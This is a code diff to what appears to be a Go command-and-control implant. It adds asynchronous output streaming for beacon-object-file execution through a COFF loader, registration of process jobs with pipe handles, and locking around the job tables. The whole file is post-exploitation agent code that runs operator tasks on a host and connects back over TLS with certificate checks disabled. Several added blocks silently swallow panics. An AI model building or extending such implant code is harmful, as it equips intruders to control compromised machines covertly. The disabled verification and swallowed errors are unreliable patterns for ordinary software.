@@ -11,6 +11,7 @@ import (
 	"encoding/base64"
 	"errors"
 	"fmt"
+	"gopher/bof/boffer"
 	"gopher/bof/coffer"
 	"gopher/functions"
 	"gopher/utils"
@@ -27,9 +28,15 @@ import (
 	"github.com/vmihailenco/msgpack/v5"
 )
 
+func init() {
+	boffer.RegisterJobFunc = registerJob
+}
+
 var UPLOADS map[string][]byte
 var DOWNLOADS map[string]utils.Connection
 var JOBS map[string]utils.Connection
+var JobsMutex sync.Mutex
+var ExecutionMutex sync.Mutex
 var TUNNELS sync.Map
 var TERMINALS sync.Map
 
@@ -67,7 +74,11 @@ func TaskProcess(commands [][]byte) [][]byte {
 			data, err = taskCp(command.Data)
 
 		case utils.COMMAND_EXEC_BOF:
-			data, err = taskExecBof(command.Data)
+			var code uint
+			code, data, err = taskExecBof(command.Data)
+			if code != 0 {
+				command.Code = code
+			}
 
 		case utils.COMMAND_EXIT:
 			data, err = taskExit()
@@ -238,25 +249,67 @@ func taskCp(paramsData []byte) ([]byte, error) {
 	return nil, err
 }
 
-func taskExecBof(paramsData []byte) ([]byte, error) {
+func taskExecBof(paramsData []byte) (uint, []byte, error) {
 	var params utils.ParamsExecBof
 	if err := msgpack.Unmarshal(paramsData, &params); err != nil {
-		return nil, err
+		return 0, nil, err
 	}
+
+	defer func() {
+		if r := recover(); r != nil {
+
+		}
+	}()
 
 	args, err := base64.StdEncoding.DecodeString(params.ArgsPack)
 	if err != nil {
 		args = make([]byte, 1)
 	}
 
+	// The first 4 bytes of args contain a task ID from the client extension.
+	// Replace it with params.Task (the server's task ID) to ensure job output
+	// is correctly correlated with the server task.
+	var serverTaskId uint32
+	if len(args) >= 8 && params.Task != "" {
+		// Parse the hex task ID string to uint32
+		_, err := fmt.Sscanf(params.Task, "%x", &serverTaskId)
+		if err == nil {
+
+		}
+	}
+
+	ExecutionMutex.Lock()
+	boffer.CurrentTaskID = serverTaskId
 	msgs, err := coffer.Load(params.Object, args)
+	boffer.CurrentTaskID = 0
+	ExecutionMutex.Unlock()
+
 	if err != nil {
-		return nil, err
+		return 0, nil, err
+	}
+
+	// Check if this launched an async job (for streaming output)
+	if serverTaskId != 0 && IsProcessJobRunning(serverTaskId) {
+		// Found running job! Use COMMAND_EXEC_BOF_OUT to keep task open.
+		// We must assume the initial output is text (e.g. "Process started") and wrap it.
+		var outputText string
+		for _, msg := range msgs {
+			if len(msg.Data) > 0 {
+				outputText += string(msg.Data)
+			}
+		}
+
+		bofOut := utils.AnsExecBofOut{
+			Type: utils.CALLBACK_OUTPUT_UTF8,
+			Data: []byte(outputText),
+		}
+		data, _ := msgpack.Marshal(bofOut)
+		return utils.COMMAND_EXEC_BOF_OUT, data, nil
 	}
 
 	list, _ := msgpack.Marshal(msgs)
-
-	return msgpack.Marshal(utils.AnsExecBof{Msgs: list})
+	val, _ := msgpack.Marshal(utils.AnsExecBof{Msgs: list})
+	return 0, val, nil
 }
 
 func taskExit() ([]byte, error) {
@@ -270,9 +323,11 @@ func taskJobList() ([]byte, error) {
 	for k, v := range DOWNLOADS {
 		jobList = append(jobList, utils.JobInfo{JobId: k, JobType: v.PackType})
 	}
+	JobsMutex.Lock()
 	for k, v := range JOBS {
 		jobList = append(jobList, utils.JobInfo{JobId: k, JobType: v.PackType})
 	}
+	JobsMutex.Unlock()
 
 	list, _ := msgpack.Marshal(jobList)
 
@@ -286,9 +341,18 @@ func taskJobKill(paramsData []byte) ([]byte, error) {
 		return nil, err
 	}
 
+	// First try to kill as a ProcessJob (new polling-based jobs)
+	if killProcessJob(params.Id) {
+
+		return nil, nil
+	}
+
+	// Fall back to legacy DOWNLOADS/JOBS maps for other job types
 	job, ok := DOWNLOADS[params.Id]
 	if !ok {
+		JobsMutex.Lock()
 		job, ok = JOBS[params.Id]
+		JobsMutex.Unlock()
 		if !ok {
 			return nil, fmt.Errorf("job '%s' not found", params.Id)
 		}
@@ -298,7 +362,9 @@ func taskJobKill(paramsData []byte) ([]byte, error) {
 		job.JobCancel()
 	}
 
-	job.HandleCancel()
+	if job.HandleCancel != nil {
+		job.HandleCancel()
+	}
 
 	return nil, nil
 }
@@ -804,7 +870,7 @@ func jobRun(paramsData []byte) ([]byte, error) {
 		cert, certerr := tls.X509KeyPair(profile.SslCert, profile.SslKey)
 		if certerr != nil {
 			procCancel()
-			return nil, err
+			return nil, certerr
 		}
 
 		caCertPool := x509.NewCertPool()
@@ -816,7 +882,6 @@ func jobRun(paramsData []byte) ([]byte, error) {
 			InsecureSkipVerify: true,
 		}
 		conn, err = tls.Dial("tcp", profile.Addresses[0], config)
-
 	} else {
 		conn, err = net.Dial("tcp", profile.Addresses[0])
 	}
@@ -831,14 +896,18 @@ func jobRun(paramsData []byte) ([]byte, error) {
 		JobCancel: procCancel,
 	}
 	connection.Ctx, connection.HandleCancel = context.WithCancel(context.Background())
+	JobsMutex.Lock()
 	JOBS[params.Task] = connection
+	JobsMutex.Unlock()
 
 	go func() {
 		defer func() {
 			procCancel()
 			connection.HandleCancel()
 			_ = conn.Close()
+			JobsMutex.Lock()
 			delete(JOBS, params.Task)
+			JobsMutex.Unlock()
 		}()
 
 		jobPack, _ := msgpack.Marshal(utils.JobPack{Id: uint(AgentId), Type: profile.Type, Task: params.Task})
@@ -1328,4 +1397,16 @@ func jobTerminal(paramsData []byte) {
 		_ = process.Wait()
 		cancel()
 	}()
+}
+
+func registerJob(taskId uint32, hProcess uintptr, pid uint16, hPipeRead uintptr, hPipeWrite uintptr) bool {
+
+	defer func() {
+		if r := recover(); r != nil {
+
+		}
+	}()
+
+	// Use the new polling-based approach (matching C++ JobsController)
+	return registerProcessJob(taskId, hProcess, pid, hPipeRead, hPipeWrite)
 }
